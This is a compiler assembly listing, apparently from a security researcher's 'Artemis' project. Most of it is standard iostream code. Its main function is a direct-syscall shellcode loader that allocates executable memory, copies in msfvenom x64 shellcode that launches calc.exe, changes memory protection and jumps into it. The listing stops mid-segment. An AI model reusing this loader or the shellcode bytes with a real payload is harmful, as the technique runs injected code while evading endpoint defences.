; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAVios_base@1@AEAV21@@Z@Z
_TEXT	SEGMENT
this$ = 48
_Pfn$ = 56
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAVios_base@1@AEAV21@@Z@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::operator<<, COMDAT

; 195  :     basic_ostream& __CLR_OR_THIS_CALL operator<<(ios_base&(__cdecl* _Pfn)(ios_base&) ) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 196  :         // call ios_base manipulator
; 197  :         _Pfn(*this);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	QWORD PTR _Pfn$[rsp]

; 198  :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 199  :     }

	add	rsp, 40					; 00000028H
	ret	0
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAVios_base@1@AEAV21@@Z@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::operator<<
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z
_TEXT	SEGMENT
this$ = 48
_Pfn$ = 56
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::operator<<, COMDAT

; 184  :     basic_ostream& __CLR_OR_THIS_CALL operator<<(basic_ostream&(__cdecl* _Pfn)(basic_ostream&) ) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 185  :         // call basic_ostream manipulator
; 186  :         return _Pfn(*this);

	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR _Pfn$[rsp]

; 187  :     }

	add	rsp, 40					; 00000028H
	ret	0
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::operator<<
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
tv153 = 32
tv154 = 36
tv156 = 40
tv155 = 48
this$ = 80
?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ PROC ; std::basic_ostream<char,std::char_traits<char> >::_Osfx, COMDAT

; 154  :     void __CLR_OR_THIS_CALL _Osfx() { // perform any wrapup

$LN11:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 155  :         _TRY_BEGIN
; 156  :         if (this->good() && this->flags() & ios_base::unitbuf) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?good@ios_base@std@@QEBA_NXZ		; std::ios_base::good
	mov	BYTE PTR tv153[rsp], al
	movzx	eax, BYTE PTR tv153[rsp]
	test	eax, eax
	je	$LN3@Osfx
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	DWORD PTR tv154[rsp], eax
	mov	eax, DWORD PTR tv154[rsp]
	and	eax, 2
	test	eax, eax
	je	SHORT $LN3@Osfx

; 157  :             if (_Myios::rdbuf()->pubsync() == -1) { // flush stream as needed

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
	mov	QWORD PTR tv155[rsp], rax
	mov	rcx, QWORD PTR tv155[rsp]
	call	?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ ; std::basic_streambuf<char,std::char_traits<char> >::pubsync
	mov	DWORD PTR tv156[rsp], eax
	cmp	DWORD PTR tv156[rsp], -1
	jne	SHORT $LN3@Osfx

; 158  :                 _Myios::setstate(ios_base::badbit);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
	npad	1
$LN3@Osfx:
	jmp	SHORT $LN8@Osfx
$LN9@Osfx:
$LN8@Osfx:

; 159  :             }
; 160  :         }
; 161  :         _CATCH_ALL
; 162  :         _CATCH_END
; 163  :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::_Osfx
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv153 = 32
tv154 = 36
tv156 = 40
tv155 = 48
this$ = 80
?catch$0@?0??_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ@4HA PROC ; `std::basic_ostream<char,std::char_traits<char> >::_Osfx'::`1'::catch$0

; 161  :         _CATCH_ALL

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ$0:

; 162  :         _CATCH_END

	lea	rax, $LN9@catch$0
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$0@?0??_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ@4HA ENDP ; `std::basic_ostream<char,std::char_traits<char> >::_Osfx'::`1'::catch$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z
_TEXT	SEGMENT
$T1 = 32
tv80 = 40
tv79 = 48
$T2 = 56
this$ = 96
_Byte$ = 104
?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z PROC ; std::basic_ios<char,std::char_traits<char> >::widen, COMDAT

; 113  :     _Elem __CLR_OR_THIS_CALL widen(char _Byte) const { // convert _Byte to character using imbued locale

$LN4:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 114  :         return _STD use_facet<_Ctype>(getloc()).widen(_Byte);

	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ; std::ios_base::getloc
	mov	QWORD PTR tv80[rsp], rax
	mov	rax, QWORD PTR tv80[rsp]
	mov	QWORD PTR tv79[rsp], rax
	mov	rcx, QWORD PTR tv79[rsp]
	call	??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z ; std::use_facet<std::ctype<char> >
	movzx	edx, BYTE PTR _Byte$[rsp]
	mov	rcx, rax
	call	?widen@?$ctype@D@std@@QEBADD@Z		; std::ctype<char>::widen
	mov	BYTE PTR $T1[rsp], al
	lea	rcx, QWORD PTR $T2[rsp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	movzx	eax, BYTE PTR $T1[rsp]

; 115  :     }

	add	rsp, 88					; 00000058H
	ret	0
?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z ENDP ; std::basic_ios<char,std::char_traits<char> >::widen
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
tv80 = 40
tv79 = 48
$T2 = 56
this$ = 96
_Byte$ = 104
?dtor$0@?0??widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z@4HA PROC ; `std::basic_ios<char,std::char_traits<char> >::widen'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T2[rbp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z@4HA ENDP ; `std::basic_ios<char,std::char_traits<char> >::widen'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADXZ
_TEXT	SEGMENT
this$ = 8
?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADXZ PROC ; std::basic_ios<char,std::char_traits<char> >::fill, COMDAT

; 99   :     _Elem __CLR_OR_THIS_CALL fill() const {

	mov	QWORD PTR [rsp+8], rcx

; 100  :         return _Fillch;

	mov	rax, QWORD PTR this$[rsp]
	movzx	eax, BYTE PTR [rax+88]

; 101  :     }

	ret	0
?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADXZ ENDP ; std::basic_ios<char,std::char_traits<char> >::fill
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ PROC ; std::basic_ios<char,std::char_traits<char> >::rdbuf, COMDAT

; 78   :     _NODISCARD _Mysb* __CLR_OR_THIS_CALL rdbuf() const {

	mov	QWORD PTR [rsp+8], rcx

; 79   :         return _Mystrbuf;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+72]

; 80   :     }

	ret	0
?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ENDP ; std::basic_ios<char,std::char_traits<char> >::rdbuf
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ PROC ; std::basic_ios<char,std::char_traits<char> >::tie, COMDAT

; 68   :     _Myos* __CLR_OR_THIS_CALL tie() const {

	mov	QWORD PTR [rsp+8], rcx

; 69   :         return _Tiestr;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+80]

; 70   :     }

	ret	0
?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ ENDP ; std::basic_ios<char,std::char_traits<char> >::tie
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z
_TEXT	SEGMENT
this$ = 48
_State$ = 56
_Reraise$ = 64
?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z PROC ; std::basic_ios<char,std::char_traits<char> >::setstate, COMDAT

; 51   :         iostate _State, bool _Reraise = false) { // merge _State into state, possibly reraise exception

$LN3:
	mov	BYTE PTR [rsp+24], r8b
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 52   :         clear(rdstate() | _State, _Reraise);

	mov	rcx, QWORD PTR this$[rsp]
	call	?rdstate@ios_base@std@@QEBAHXZ		; std::ios_base::rdstate
	or	eax, DWORD PTR _State$[rsp]
	movzx	r8d, BYTE PTR _Reraise$[rsp]
	mov	edx, eax
	mov	rcx, QWORD PTR this$[rsp]
	call	?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::clear

; 53   :     }

	add	rsp, 40					; 00000028H
	ret	0
?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ENDP ; std::basic_ios<char,std::char_traits<char> >::setstate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z
_TEXT	SEGMENT
tv72 = 32
this$ = 64
_State$ = 72
_Reraise$ = 80
?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z PROC ; std::basic_ios<char,std::char_traits<char> >::clear, COMDAT

; 39   :     void __CLR_OR_THIS_CALL clear(iostate _State = goodbit, bool _Reraise = false) {

$LN5:
	mov	BYTE PTR [rsp+24], r8b
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 40   :         // set state, possibly reraise exception
; 41   :         ios_base::clear(_State | (_Mystrbuf ? ios_base::_Iostate{} : ios_base::badbit), _Reraise);

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax+72], 0
	je	SHORT $LN3@clear
	mov	DWORD PTR tv72[rsp], 0
	jmp	SHORT $LN4@clear
$LN3@clear:
	mov	DWORD PTR tv72[rsp], 4
$LN4@clear:
	mov	eax, DWORD PTR tv72[rsp]
	mov	ecx, DWORD PTR _State$[rsp]
	or	ecx, eax
	mov	eax, ecx
	movzx	r8d, BYTE PTR _Reraise$[rsp]
	mov	edx, eax
	mov	rcx, QWORD PTR this$[rsp]
	call	?clear@ios_base@std@@QEAAXH_N@Z		; std::ios_base::clear

; 42   :     }

	add	rsp, 56					; 00000038H
	ret	0
?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ENDP ; std::basic_ios<char,std::char_traits<char> >::clear
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Users\james\OneDrive\Documents\Security-Research\Projects\Artemis\syscallExample\syscallExample.cpp
_TEXT	SEGMENT
baseAddress$ = 48
vpStatus$ = 56
protect$ = 60
status$ = 64
allocationType$ = 68
regionSize$ = 72
oldProtect$ = 80
processHandle$ = 88
buf$ = 96
__$ArrayPad$ = 384
main	PROC

; 30   : int main() {

$LN9:
	push	rsi
	push	rdi
	sub	rsp, 408				; 00000198H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 31   : 
; 32   :     PVOID baseAddress = nullptr;

	mov	QWORD PTR baseAddress$[rsp], 0

; 33   :     SIZE_T regionSize = 4096;

	mov	QWORD PTR regionSize$[rsp], 4096	; 00001000H

; 34   :     DWORD allocationType = MEM_COMMIT | MEM_RESERVE;

	mov	DWORD PTR allocationType$[rsp], 12288	; 00003000H

; 35   :     DWORD protect = PAGE_EXECUTE_READWRITE;

	mov	DWORD PTR protect$[rsp], 64		; 00000040H

; 36   : 
; 37   :     // Get the process handle for the current process
; 38   :     HANDLE processHandle = GetCurrentProcess();

	call	QWORD PTR __imp_GetCurrentProcess
	mov	QWORD PTR processHandle$[rsp], rax

; 39   : 
; 40   :     // Call the NtAllocateVirtualMemory function from the assembly code
; 41   :     printf("\nBreak1");

	lea	rcx, OFFSET FLAT:$SG124172
	call	printf

; 42   :     NTSTATUS vpStatus = NtAllocateVirtualMemory(

	mov	eax, DWORD PTR protect$[rsp]
	mov	DWORD PTR [rsp+40], eax
	mov	eax, DWORD PTR allocationType$[rsp]
	mov	DWORD PTR [rsp+32], eax
	lea	r9, QWORD PTR regionSize$[rsp]
	xor	r8d, r8d
	lea	rdx, QWORD PTR baseAddress$[rsp]
	mov	rcx, QWORD PTR processHandle$[rsp]
	call	NtAllocateVirtualMemory
	mov	DWORD PTR vpStatus$[rsp], eax

; 43   :         processHandle, &baseAddress, 0, &regionSize, allocationType, protect
; 44   :     );
; 45   : 
; 46   :     if (vpStatus == 0) {

	cmp	DWORD PTR vpStatus$[rsp], 0
	jne	SHORT $LN4@main

; 47   :         std::cout << "Allocated memory at: " << baseAddress << std::endl;

	lea	rdx, OFFSET FLAT:$SG124175
	lea	rcx, OFFSET FLAT:?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
	call	??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z ; std::operator<<<std::char_traits<char> >
	mov	rdx, QWORD PTR baseAddress$[rsp]
	mov	rcx, rax
	call	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
	lea	rdx, OFFSET FLAT:??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z ; std::endl<char,std::char_traits<char> >
	mov	rcx, rax
	call	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 48   :     } else {

	jmp	SHORT $LN5@main
$LN4@main:

; 49   :         std::cout << "Memory allocation failed. Status: 0x" << std::hex << vpStatus << std::endl;

	lea	rdx, OFFSET FLAT:$SG124176
	lea	rcx, OFFSET FLAT:?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
	call	??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z ; std::operator<<<std::char_traits<char> >
	lea	rdx, OFFSET FLAT:?hex@std@@YAAEAVios_base@1@AEAV21@@Z ; std::hex
	mov	rcx, rax
	call	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAVios_base@1@AEAV21@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
	mov	edx, DWORD PTR vpStatus$[rsp]
	mov	rcx, rax
	call	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
	lea	rdx, OFFSET FLAT:??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z ; std::endl<char,std::char_traits<char> >
	mov	rcx, rax
	call	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
$LN5@main:

; 50   :     }
; 51   : 
; 52   :     printf("Base Address of VirtualAlloc: %p", baseAddress);

	mov	rdx, QWORD PTR baseAddress$[rsp]
	lea	rcx, OFFSET FLAT:$SG124177
	call	printf

; 53   : 
; 54   :     // x64 calc.exe cmd from msfvenom
; 55   :     unsigned char buf[] = 

	lea	rax, QWORD PTR buf$[rsp]
	lea	rcx, OFFSET FLAT:$SG124178
	mov	rdi, rax
	mov	rsi, rcx
	mov	ecx, 277				; 00000115H
	rep movsb

; 56   :         "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
; 57   :         "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
; 58   :         "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
; 59   :         "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
; 60   :         "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
; 61   :         "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
; 62   :         "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
; 63   :         "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
; 64   :         "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
; 65   :         "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
; 66   :         "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
; 67   :         "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
; 68   :         "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
; 69   :         "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
; 70   :         "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
; 71   :         "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
; 72   :         "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
; 73   :         "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
; 74   :         "\x63\x2e\x65\x78\x65\x00";
; 75   : 
; 76   :     *(UINT64*)baseAddress = *buf;

	mov	eax, 1
	imul	rax, rax, 0
	movzx	eax, BYTE PTR buf$[rsp+rax]
	mov	rcx, QWORD PTR baseAddress$[rsp]
	mov	QWORD PTR [rcx], rax

; 77   :     memcpy(baseAddress, buf, sizeof(buf));  // copy into allocated mem location

	mov	r8d, 277				; 00000115H
	lea	rdx, QWORD PTR buf$[rsp]
	mov	rcx, QWORD PTR baseAddress$[rsp]
	call	memcpy

; 78   : 
; 79   :     // Call the NtProtectVirtualMemory syscall from the assembly file
; 80   :     ULONG oldProtect;
; 81   :     NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress,

	call	QWORD PTR __imp_GetCurrentProcess
	mov	ecx, DWORD PTR ?syscallID@@3HA		; syscallID
	mov	DWORD PTR [rsp+40], ecx
	lea	rcx, QWORD PTR oldProtect$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9d, DWORD PTR protect$[rsp]
	lea	r8, QWORD PTR regionSize$[rsp]
	lea	rdx, QWORD PTR baseAddress$[rsp]
	mov	rcx, rax
	call	NtProtectVirtualMemory
	mov	DWORD PTR status$[rsp], eax

; 82   :                                              &regionSize, protect, &oldProtect, syscallID);
; 83   : 
; 84   :     printf("jumperr");

	lea	rcx, OFFSET FLAT:$SG124179
	call	printf

; 85   :     jumper((UINT64*)baseAddress);

	mov	rcx, QWORD PTR baseAddress$[rsp]
	call	jumper

; 86   : 
; 87   :     if (NT_SUCCESS(status)) {

	cmp	DWORD PTR status$[rsp], 0
	jl	SHORT $LN6@main

; 88   :         std::cout << "Memory protection changed successfully." << std::endl;

	lea	rdx, OFFSET FLAT:$SG124182
	lea	rcx, OFFSET FLAT:?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
	call	??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z ; std::operator<<<std::char_traits<char> >
	lea	rdx, OFFSET FLAT:??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z ; std::endl<char,std::char_traits<char> >
	mov	rcx, rax
	call	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 89   :     } else {

	jmp	SHORT $LN7@main
$LN6@main:

; 90   :         std::cout << "NtProtectVirtualMemory failed. Status: 0x" << std::hex << status << std::endl;

	lea	rdx, OFFSET FLAT:$SG124183
	lea	rcx, OFFSET FLAT:?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
	call	??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z ; std::operator<<<std::char_traits<char> >
	lea	rdx, OFFSET FLAT:?hex@std@@YAAEAVios_base@1@AEAV21@@Z ; std::hex
	mov	rcx, rax
	call	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAVios_base@1@AEAV21@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
	mov	edx, DWORD PTR status$[rsp]
	mov	rcx, rax
	call	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
	lea	rdx, OFFSET FLAT:??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z ; std::endl<char,std::char_traits<char> >
	mov	rcx, rax
	call	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
$LN7@main:

; 91   :     }
; 92   : 
; 93   :     // Free the allocated memory
; 94   :     VirtualFree(baseAddress, 0, MEM_RELEASE);

	mov	r8d, 32768				; 00008000H
	xor	edx, edx
	mov	rcx, QWORD PTR baseAddress$[rsp]
	call	QWORD PTR __imp_VirtualFree
$LN2@main:

; 95   : 
; 96   :     while(true) {

	xor	eax, eax
	cmp	eax, 1
	je	SHORT $LN3@main

; 97   : 
; 98   :     }

	jmp	SHORT $LN2@main
$LN3@main:

; 99   : 
; 100  :     return 0;

	xor	eax, eax

; 101  : }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 408				; 00000198H
	pop	rdi
	pop	rsi
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Users\james\OneDrive\Documents\Security-Research\Projects\Artemis\syscallExample\syscallExample.cpp
;	COMDAT ??__EsyscallID@@YAXXZ
text$di	SEGMENT
$T1 = 32
tv66 = 40
$T2 = 48
??__EsyscallID@@YAXXZ PROC				; `dynamic initializer for 'syscallID'', COMDAT

; 28   : int syscallID = artemis.controller("NtProtectVirtualMemory");

	sub	rsp, 88					; 00000058H
	lea	rax, QWORD PTR $T2[rsp]
	mov	QWORD PTR $T1[rsp], rax
	lea	rdx, OFFSET FLAT:$SG123900
	mov	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	QWORD PTR tv66[rsp], rax
	mov	rdx, QWORD PTR tv66[rsp]
	lea	rcx, OFFSET FLAT:?artemis@@3VArtemis@@A	; artemis
	call	?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; Artemis::controller
	mov	DWORD PTR ?syscallID@@3HA, eax		; syscallID
	add	rsp, 88					; 00000058H
	ret	0
??__EsyscallID@@YAXXZ ENDP				; `dynamic initializer for 'syscallID''
text$di	ENDS
; Function compile flags: /Odtp
;	COMDAT ??__Fartemis@@YAXXZ
text$yd	SEGMENT
??__Fartemis@@YAXXZ PROC				; `dynamic atexit destructor for 'artemis'', COMDAT
	sub	rsp, 40					; 00000028H
	lea	rcx, OFFSET FLAT:?artemis@@3VArtemis@@A	; artemis
	call	??1Artemis@@QEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??__Fartemis@@YAXXZ ENDP				; `dynamic atexit destructor for 'artemis''
text$yd	ENDS
; Function compile flags: /Odtp
; File C:\Users\james\OneDrive\Documents\Security-Research\Projects\Artemis\syscallExample\syscallExample.cpp
;	COMDAT ??__Eartemis@@YAXXZ
